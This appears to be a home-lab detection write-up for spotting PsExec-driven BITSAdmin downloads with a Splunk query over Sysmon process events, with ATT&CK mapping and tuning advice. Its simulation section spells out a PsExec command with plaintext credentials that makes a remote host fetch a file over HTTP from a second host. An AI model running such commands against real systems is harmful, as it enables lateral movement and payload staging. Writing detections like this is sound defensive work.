# Detection 04: PsExec BITS File Transfer Activity

Detects PsExec-based lateral movement by identifying BITSAdmin-driven HTTP file transfers executed via the PSEXESVC service.

## Objective

Detect file download activity using BITSAdmin executed via PsExec by identifying command-line indicators of BITS-based transfers.

## ATT&CK Mapping

- T1059.003 – Command and Scripting Interpreter: Windows Command Shell  
- T1105 – Ingress Tool Transfer  
- T1197 – BITS Jobs  

## Data Sources

- Sysmon  
- Splunk  

## Relevant Events

- Sysmon Event ID 1 – Process Creation  

## SPL Query

```splindex=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| rex field=_raw "<Data Name='Image'>(?<Image>[^<]+)</Data>"
| rex field=_raw "<Data Name='CommandLine'>(?<CommandLine>[^<]+)</Data>"
| rex field=_raw "<Data Name='ParentImage'>(?<ParentImage>[^<]+)</Data>"
| rex field=_raw "<Data Name='User'>(?<User>[^<]+)</Data>"
| where like(ParentImage,"%PSEXESVC.exe%")
| where like(CommandLine,"%bitsadmin%")
| where like(CommandLine,"%bits_test.txt%")
| table _time host Image CommandLine ParentImage User
| sort -_time
```

## Attack Simulation
```
PsExec Remote Execution (BITS File Retrieval via bitsadmin)
C:\PSTools\PsExec.exe \\192.168.1.16 -u labuser -p abc123 cmd.exe /c bitsadmin /transfer job1 /download /priority foreground http://192.168.1.25:8080/test.txt C:\Windows\Temp\bits_test.txt
```

## Detection Logic

This detection identifies PsExec activity by monitoring command-line usage of bitsadmin executed from processes spawned by PSEXESVC.exe. BITSAdmin can download files over HTTP while blending with legitimate background transfer activity, making it a common technique for stealthy payload delivery.

## Screenshot

## Analysis

Host: WIN-ENDPOINT-01  
User: labuser  
Parent Process: PSEXESVC.exe  
Child Process: cmd.exe  
Command Executed: bitsadmin /transfer job /download /priority foreground http://192.168.1.25:8080/test.txt  

This activity indicates PsExec-based remote execution followed by file transfer using BITSAdmin. The use of bitsadmin to download a file over HTTP suggests payload staging or tool transfer, which aligns with post-exploitation behavior and lateral movement techniques.

## False Positives

- Legitimate use of BITSAdmin for software updates or file transfers
- Administrative scripts utilizing BITS for background downloads

## Tuning Recommendations 

- Filter known administrative scripts or automation tools
- Correlate with parent process (PSEXESVC.exe)
- Identify unusual or unauthorized HTTP destinations
- Monitor for rare or first-time use of bitsadmin on endpoints

## Severity

Medium-High
